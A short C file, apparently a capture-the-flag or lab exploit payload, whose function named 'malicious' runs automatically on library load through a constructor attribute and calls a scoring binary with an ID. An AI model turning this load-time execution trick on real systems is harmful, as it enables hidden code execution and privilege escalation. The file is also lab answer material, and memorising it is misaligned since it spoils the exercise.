#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score 554c342e-050e-43b8-bd9d-f8d8f2304d0d");
}
